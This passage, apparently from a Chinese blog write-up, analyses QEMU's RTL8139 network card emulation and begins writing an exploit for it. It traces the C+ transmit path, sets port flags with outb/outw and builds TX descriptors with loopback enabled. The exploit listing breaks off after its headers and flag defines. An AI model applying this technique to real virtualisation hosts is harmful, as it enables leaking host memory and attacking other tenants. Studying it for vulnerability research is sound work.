<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_ioport_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        rtl8139_io_writeb(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rtl8139_io_writew(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        rtl8139_io_writel(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">rtl8139_ioport_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> rtl8139_io_readb(opaque, addr);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> rtl8139_io_readw(opaque, addr);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> rtl8139_io_readl(opaque, addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到读和写各有三种操作.分别是byte word long三种方式.最后做一个分发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MAC0 ... MAC0+<span class="number">4</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MAC0+<span class="number">5</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            qemu_format_nic_info_str(qemu_get_queue(s-&gt;nic), s-&gt;phys);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MAC0+<span class="number">6</span> ... MAC0+<span class="number">7</span>:</span><br><span class="line">            <span class="comment">/* reserved */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MAR0 ... MAR0+<span class="number">7</span>:</span><br><span class="line">            s-&gt;mult[addr - MAR0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ChipCmd:</span><br><span class="line">            rtl8139_ChipCmd_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Cfg9346:</span><br><span class="line">            rtl8139_Cfg9346_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TxConfig: <span class="comment">/* windows driver sometimes writes using byte-lenth call */</span></span><br><span class="line">            rtl8139_TxConfig_writeb(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Config0:</span><br><span class="line">            rtl8139_Config0_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Config1:</span><br><span class="line">            rtl8139_Config1_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Config3:</span><br><span class="line">            rtl8139_Config3_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Config4:</span><br><span class="line">            rtl8139_Config4_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Config5:</span><br><span class="line">            rtl8139_Config5_write(s, val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MediaStatus:</span><br><span class="line">            <span class="comment">/* ignore */</span></span><br><span class="line">            DPRINTF(<span class="string">"not implemented write(b) to MediaStatus val=0x%02x\n"</span>,</span><br><span class="line">                val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> HltClk:</span><br><span class="line">            DPRINTF(<span class="string">"HltClk write val=0x%08x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val == <span class="string">'R'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s-&gt;clock_enabled = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (val == <span class="string">'H'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s-&gt;clock_enabled = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TxThresh:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxThresh write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            s-&gt;TxThresh = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TxPoll:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxPoll write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll high priority transmission (not "</span></span><br><span class="line">                    <span class="string">"implemented)\n"</span>);</span><br><span class="line">                <span class="comment">//rtl8139_cplus_transmit(s);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">6</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll normal priority transmission\n"</span>);</span><br><span class="line">                rtl8139_cplus_transmit(s);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            DPRINTF(<span class="string">"not implemented write(b) addr=0x%x val=0x%02x\n"</span>, addr,</span><br><span class="line">                val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以整理出最后的函数调用顺序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rtl8139_ioport_write</span><br><span class="line">	rtl8139_io_writeb</span><br><span class="line">		rtl8139_cplus_transmit</span><br><span class="line">			rtl8139_cplus_transmit_one</span><br><span class="line">				....</span><br></pre></td></tr></table></figure>
<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>iopl(3)</p>
<p>调整权限.然后开始按照网卡的路径进行约束.</p>
<p>首先是开头的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!rtl8139_transmitter_enabled(s))</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode: transmitter disabled\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!rtl8139_cp_transmitter_enabled(s))</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode: C+ transmitter disabled\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_transmitter_enabled</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;bChipCmdState &amp; CmdTxEnb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cp_transmitter_enabled</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;CpCmd &amp; CPlusTxEnb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知要操作RTL8139中的CpCmd端口,以及ChipCmd端口,函数如下(其中out*的选择,可以通过查看io分发函数知道.)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outb(CmdTxEnb|CmdRxEnb,RTL8139 + ChipCmd);</span><br><span class="line">outw(CPlusTxEnb|CPlusRxEnb,RTL8139 + CpCmd);</span><br></pre></td></tr></table></figure>
<p>紧接着在后面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PCIDevice *d = PCI_DEVICE(s);</span><br><span class="line">    <span class="keyword">int</span> descriptor = s-&gt;currCPlusTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">dma_addr_t</span> cplus_tx_ring_desc = rtl8139_addr64(s-&gt;TxAddr[<span class="number">0</span>], s-&gt;TxAddr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal priority ring */</span></span><br><span class="line">    cplus_tx_ring_desc += <span class="number">16</span> * descriptor;</span><br><span class="line"></span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode reading TX descriptor %d from host memory at "</span></span><br><span class="line">        <span class="string">"%08x %08x = 0x"</span>DMA_ADDR_FMT<span class="string">"\n"</span>, descriptor, s-&gt;TxAddr[<span class="number">1</span>],</span><br><span class="line">        s-&gt;TxAddr[<span class="number">0</span>], cplus_tx_ring_desc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> val, txdw0,txdw1,txbufLO,txbufHI;</span><br><span class="line"></span><br><span class="line">    pci_dma_read(d, cplus_tx_ring_desc,    (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line">    txdw0 = le32_to_cpu(val);</span><br><span class="line">    pci_dma_read(d, cplus_tx_ring_desc+<span class="number">4</span>,  (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line">    txdw1 = le32_to_cpu(val);</span><br><span class="line">    pci_dma_read(d, cplus_tx_ring_desc+<span class="number">8</span>,  (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line">    txbufLO = le32_to_cpu(val);</span><br><span class="line">    pci_dma_read(d, cplus_tx_ring_desc+<span class="number">12</span>, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line">    txbufHI = le32_to_cpu(val);</span><br><span class="line"></span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode TX descriptor %d %08x %08x %08x %08x\n"</span>, descriptor,</span><br><span class="line">    txdw0, txdw1, txbufLO, txbufHI);</span><br></pre></td></tr></table></figure>
<p>可以看到代码从s-&gt;TxAddr[0]和s-&gt;TxAddr[1]中取出了两个uint32_t,并且合并成cplus_tx_ring_desc,即cplus tx ring description.通过pci_dma_read函数可以看到这个cplus_tx_ring_desc大概可以写成这个样子:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cplus_tx_ring_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> txdw0;</span><br><span class="line">	<span class="keyword">uint32_t</span> txdw1;</span><br><span class="line">	<span class="keyword">uint32_t</span> txbufLO;</span><br><span class="line">	<span class="keyword">uint32_t</span> txbufHI;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面又是要限定一堆标志位,才能到达最后的loop中,最后还需要开启TxLoopBack,这样我们就能收到我们发送的数据包了.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(txdw0 &amp; CP_TX_OWN))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (txdw0 &amp; CP_TX_FS)</span><br><span class="line">   &#123;</span><br><span class="line">       s-&gt;cplus_txbuffer_offset = <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> txsize = txdw0 &amp; CP_TX_BUFFER_SIZE_MASK;</span><br><span class="line">   <span class="keyword">dma_addr_t</span> tx_addr = rtl8139_addr64(txbufLO, txbufHI);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!s-&gt;cplus_txbuffer)</span><br><span class="line">   &#123;</span><br><span class="line">       s-&gt;cplus_txbuffer_len = CP_TX_BUFFER_SIZE;</span><br><span class="line">       s-&gt;cplus_txbuffer = g_malloc(s-&gt;cplus_txbuffer_len);</span><br><span class="line">       s-&gt;cplus_txbuffer_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       DPRINTF(<span class="string">"+++ C+ mode transmission buffer allocated space %d\n"</span>,</span><br><span class="line">           s-&gt;cplus_txbuffer_len);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (txdw0 &amp; CP_TX_EOR)</span><br><span class="line">   &#123;</span><br><span class="line">       s-&gt;currCPlusTxDesc = <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       ++s-&gt;currCPlusTxDesc;</span><br><span class="line">       <span class="keyword">if</span> (s-&gt;currCPlusTxDesc &gt;= <span class="number">64</span>)</span><br><span class="line">           s-&gt;currCPlusTxDesc = <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line">     </span><br><span class="line">   <span class="keyword">if</span> (txdw0 &amp; CP_TX_LS)</span><br><span class="line">   &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">       &#123;</span><br><span class="line">           </span><br><span class="line">          ....</span><br><span class="line">              </span><br><span class="line">           <span class="keyword">if</span> ((txdw0 &amp; CP_TX_LGSEN) &amp;&amp; ip_protocol == IP_PROTO_TCP)</span><br><span class="line">           &#123;</span><br><span class="line">               </span><br><span class="line">             ...</span><br><span class="line">               <span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size)</span><br><span class="line">               &#123;</span><br><span class="line">                  ...</span><br><span class="line">                   <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">                   &#123;</span><br><span class="line">                       <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">                   &#125;</span><br><span class="line">			  ...</span><br><span class="line">                   rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">                       <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">                  ...</span><br><span class="line">               &#125;</span><br><span class="line">               ...</span><br><span class="line">           &#125;</span><br><span class="line">          ...</span><br></pre></td></tr></table></figure>
<p>这是第一版本的exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* large send packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">/* large send MSS mask, bits 16...25 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* UDP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_UDPCS (1&lt;&lt;17)</span></span><br><span class="line"><span 